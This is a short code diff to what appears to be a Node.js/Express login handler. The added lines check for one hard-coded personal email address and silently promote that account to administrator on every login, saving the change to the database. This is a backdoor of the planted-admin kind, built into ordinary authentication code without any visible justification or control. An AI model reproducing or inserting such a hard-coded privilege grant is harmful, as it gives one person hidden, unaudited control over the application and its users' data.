@@ -45,6 +45,10 @@ exports.postLogin = async (req, res, next) => {
       req.flash("error", "invalid password");
       return res.redirect("/login");
     }
+    if (user.email === "mitakikelvin1@gmail.com") {
+      user.admin = true;
+      await user.save();
+    }
 
     req.session.user = user;
     req.session.isLoggedIn = true;
